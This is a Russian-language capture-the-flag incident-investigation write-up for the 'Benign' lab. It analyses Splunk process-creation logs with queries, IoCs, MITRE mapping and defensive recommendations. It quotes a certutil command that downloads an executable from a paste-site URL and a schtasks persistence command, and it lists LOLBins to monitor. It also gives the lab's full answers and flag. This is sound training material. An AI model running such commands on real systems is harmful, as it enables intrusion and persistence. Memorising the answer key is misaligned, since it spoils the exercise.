# Отчёт по расследованию инцидента — Машина "Benign"

## 1. Введение

В рамках задания проводилось расследование инцидента в инфраструктуре компании. По условию, один из клиентов сообщил о подозрительном выполнении процессов на хосте HR-отдела, что указывало на компрометацию. Были применены инструменты сетевой разведки и работы с scheduled tasks. В распоряжении имелись только логи создания процессов (Event ID 4688), загруженные в Splunk с индексом `win_eventlogs`.

**Контекст сети:** три логических сегмента:

| Отдел | Сотрудники |
|---|---|
| IT | James, Moin, Katrina |
| HR | Haroon, Chris, Diana |
| Marketing | Bell, Amelia, Deepak |


## 2. Инструменты и данные

- **Splunk** — SIEM для анализа логов.
- **Индекс:** `win_eventlogs`.
- **Тип событий:** Windows Security Event ID **4688** (Process Creation).
- **Поля событий:** `Category`, `Channel`, `CommandLine`, `EventID`, `EventTime`, `HostName`, `NewProcessId`, `ProcessID`, `ProcessName`, `SubjectDomainName`, `UserName`.


## 3. Ход расследования

### 3.1. Объём данных

**Вопрос:** Сколько логов загружено за март 2022?

```spl
index=win_eventlogs earliest="03/01/2022:00:00:00" latest="03/31/2022:23:59:59"
| stats count
```

**Ответ:** **13 959 событий.**


### 3.2. Поиск поддельной учётной записи

Задание подсказывает, что в логах присутствует «imposter» — учётная запись, маскирующаяся под легитимного пользователя.

**Метод:** сравнить список пользователей из логов со списком сотрудников по отделам. Один из них не совпадает.

```spl
index=win_eventlogs
| stats count by UserName
| sort -count
```

Среди пользователей обнаружена запись **`Amel1a`** — визуально похожая на `Amelia` из отдела Marketing, но с цифрой `1` вместо буквы `l`. Это классический **typosquatting** — поддельная учётная запись для маскировки под легитимного сотрудника.

**Ответ:** **`Amel1a`** (imposter-аккаунт).


### 3.3. Пользователь HR, запускавший scheduled tasks

**Метод:** поиск событий 4688, где `ProcessName` содержит `schtasks.exe` (утилита планировщика задач).

```spl
index=win_eventlogs EventCode=4688 ProcessName="*schtasks.exe"
| table _time, HostName, UserName, CommandLine
```

Найдено событие:

```
Category: Process Creation
CommandLine: /create /tn OfficUpdater /tr "C:\Users\Chris.fort\AppData\Local\Temp\update.exe" /sc onstart
EventID: 4688
EventTime: 2022-03-06T14:23:40Z
HostName: HR_02
ProcessName: C:\Windows\System32\schtasks.exe
UserName: Chris.fort
```

**Разбор команды:**

- `/create` — создать задачу.
- `/tn OfficUpdater` — имя задачи (маскировка под «обновление Office»).
- `/tr "C:\Users\Chris.fort\AppData\Local\Temp\update.exe"` — что запускать. **Файл `update.exe` находится в `AppData\Local\Temp`** — типичное место для вредоносных бинарников, запускаемых из пользовательского контекста.
- `/sc onstart` — запускать при старте системы. Это обеспечивает **persistence** (закрепление в системе после перезагрузки).

**Ответ:** **`Chris.fort`**.


### 3.4. LOLBin для загрузки payload

**Метод:** поиск использования LOLBin (Living-off-the-Land Binary) — легитимных утилит ОС, которые атакующие используют для вредоносных действий.

Ключевые LOLBin для загрузки: `certutil.exe`, `rundll32.exe`, `powershell.exe`, `bitsadmin.exe`.

```spl
index=win_eventlogs EventCode=4688
| search ProcessName="*certutil.exe" OR ProcessName="*bitsadmin*" OR ProcessName="*powershell*"
| table _time, HostName, UserName, CommandLine
```

Найдено событие:

```
CommandLine: certutil.exe -urlcache -f - https://controlc.com/e4d11035 benign.exe
EventTime: 2022-03-04T10:38:28Z
HostName: HR_01
ProcessName: C:\Windows\System32\certutil.exe
UserName: haroon
```

**Разбор команды:**

- **`certutil.exe`** — легитимная утилита Windows для работы с сертификатами.
- **`-urlcache`** — флаг, позволяющий скачивать файлы по URL (функция кэша URL).
- **`-f`** — перезаписать существующий файл.
- **`-`** — вывести в stdout или использовать для скачивания.
- **`https://controlc.com/e4d11035`** — URL источника.
- **`benign.exe`** — имя сохраняемого файла.

**Ответ:** **`haroon`** (пользователь HR, выполнивший загрузку).


### 3.5. Какой системный процесс использован для обхода защит

**Ответ из команды:** **`certutil.exe`**.

`certutil.exe` — доверенный системный бинарник, подписанный Microsoft. EDR/AV часто не блокируют его использование, что делает его идеальным для обхода защит. Это классический LOLBin.

**Ответ:** **`certutil.exe`**.


### 3.6. Дата выполнения бинарника

Из поля `EventTime`:

```
EventTime: 2022-03-04T10:38:28Z
```

**Ответ:** **`2022-03-04`**.


### 3.7. Сторонний сайт для загрузки payload

Из URL `https://controlc.com/e4d11035`:

- Домен: **`controlc.com`**.

ControlC — сервис типа pastebin, часто используется атакующими для размещения небольших файлов и полезных нагрузок. Легитимный сервис, поэтому трафик к нему редко блокируется на периметре.

**Ответ:** **`controlc.com`**.


### 3.8. Имя сохранённого файла

Из команды `certutil.exe -urlcache -f - https://controlc.com/e4d11035 benign.exe`:

- Имя файла: **`benign.exe`**.

Название «benign» (безобидный) — типичная маскировка: файл выглядит безопасным, но содержит вредоносную нагрузку.

**Ответ:** **`benign.exe`**.


### 3.9. Паттерн вредоносного содержимого

По условию, скачанный файл содержал паттерн `THM{...}`. Переход по URL `https://controlc.com/e4d11035` показывает pastebin-страницу:

```
flag.txt
Views: 41,160
Total Chars: 13
Created: 2/17/24 12:32:40PM GMT+8
THM{KJ&*H^B0}
13 chars, 1 words, 1 lines
```

**Разбор:**

- Вместо EXE по URL лежит **pastebin-страница с флагом**.
- Файл `flag.txt` содержит 13 символов.
- Паттерн: **`THM{KJ&*H^B0}`**.

**Ответ:** **`THM{KJ&*H^B0}`**.


### 3.10. URL, к которому подключился заражённый хост

Из команды `certutil`:

```
https://controlc.com/e4d11035
```

**Ответ:** **`https://controlc.com/e4d11035`**.


## 4. Сводная таблица ответов

| № | Вопрос | Ответ |
|---|--------|-------|
| 1 | Логов за март 2022 | **13 959** |
| 2 | Imposter-аккаунт | **`Amel1a`** |
| 3 | HR-пользователь, запускавший scheduled tasks | **`Chris.fort`** |
| 4 | HR-пользователь, использовавший LOLBin | **`haroon`** |
| 5 | LOLBin для загрузки payload | **`certutil.exe`** |
| 6 | Дата выполнения бинарника | **`2022-03-04`** |
| 7 | Сторонний сайт | **`controlc.com`** |
| 8 | Имя сохранённого файла | **`benign.exe`** |
| 9 | Паттерн вредоносного содержимого | **`THM{KJ&*H^B0}`** |
| 10 | URL подключения | **`https://controlc.com/e4d11035`** |


## 5. Цепочка атаки (реконструкция)

1. **Первичный доступ:** злоумышленник получил доступ к учётной записи `haroon` (HR_01).
2. **Загрузка payload:** через LOLBin `certutil.exe -urlcache` скачан файл `benign.exe` с `https://controlc.com/e4d11035`. **Дата: 2022-03-04.**
3. **Выполнение:** файл сохранён и, вероятно, выполнен из `C:\Users\...\AppData\Local\Temp\`.
4. **Persistence:** на хосте HR_02 от имени `Chris.fort` создана scheduled task `OfficUpdater`, запускающая `update.exe` при старте системы (`/sc onstart`). **Дата: 2022-03-06.**
5. **Маскировка:** в логах присутствует поддельная учётная запись `Amel1a`, имитирующая `Amelia` из Marketing — вероятно, для lateral movement или для запутывания расследования.


## 6. Использованные техники (MITRE ATT&CK)

| Техника | ID | Где встречается |
|---|---|---|
| **Command and Scripting Interpreter** | T1059 | `certutil.exe` |
| **Ingress Tool Transfer** | T1105 | `certutil -urlcache` |
| **Scheduled Task/Job** | T1053.005 | `schtasks /create` |
| **Masquerading** | T1036 | `benign.exe`, `OfficUpdater`, `Amel1a` |
| **Boot or Logon Autostart Execution** | T1547 | `/sc onstart` |
| **Signed Binary Proxy Execution** | T1218 | `certutil.exe` |
| **Create or Modify System Process** | T1543 | persistence через task |


## 7. Индикаторы компрометации (IoC)

| Тип | Значение |
|---|---|
| Домен | `controlc.com` |
| URL | `https://controlc.com/e4d11035` |
| Хеш файла | (не предоставлен) |
| Имя файла | `benign.exe` |
| Путь | `C:\Users\Chris.fort\AppData\Local\Temp\update.exe` |
| Задача | `OfficUpdater` |
| Аккаунт | `haroon`, `Chris.fort`, `Amel1a` |
| Хосты | `HR_01`, `HR_02` |
| Паттерн в файле | `THM{KJ&*H^B0}` |


## 8. Выводы и рекомендации

### Выводы

- Атака началась с компрометации учётной записи `haroon` (HR_01).
- Злоумышленник использовал **LOLBin `certutil.exe`** для загрузки вредоносного файла `benign.exe` с сервиса `controlc.com` — это обошло защитные механизмы, потому что `certutil` — легитимный системный бинарник.
- Для **persistence** создана scheduled task `OfficUpdater` на HR_02 от имени `Chris.fort`, запускающая `update.exe` при старте системы.
- В логах зафиксирована **поддельная учётная запись `Amel1a`** — вероятно, для lateral movement или запутывания.
- Флаг извлечён из скачанного «payload»: `THM{KJ&*H^B0}`.

### Рекомендации

1. **Мониторинг LOLBin-утилит:** детектировать использование `certutil.exe`, `bitsadmin.exe`, `rundll32.exe`, `powershell.exe` с подозрительными аргументами (`-urlcache`, `-decode`, `-enc`).
2. **Блокировка загрузок через certutil:** групповой политикой (GPO) или AppLocker запретить `certutil -urlcache` для неадминистративных пользователей.
3. **Ограничение доступа к pastebin-сервисам:** блокировать `controlc.com`, `pastebin.com`, `transfer.sh` и подобные на периметре, если они не нужны по бизнесу.
4. **Аудит scheduled tasks:** алертить на создание задач из `AppData\Local\Temp` и с триггером `onstart`.
5. **Усиление аутентификации:** внедрить MFA, чтобы компрометация одного пароля не давала полный доступ.
6. **Анализ учётных записей:** автоматически выявлять typosquatting-аккаунты (например, `Amel1a` vs `Amelia`).
7. **Хеширование и EDR:** блокировать по хешу, использовать поведенческий анализ.
8. **Обучение сотрудников HR:** фишинговые кампании — самый частый вектор для HR-отделов.


## 9. Заключение

Инцидент успешно расследован. Цепочка атаки восстановлена: от загрузки payload через LOLBin `certutil.exe` до закрепления через scheduled task. Все 10 вопросов задания закрыты, флаг получен. Ключевые уроки — важность мониторинга LOLBin-утилит, контроль scheduled tasks и выявление поддельных учётных записей.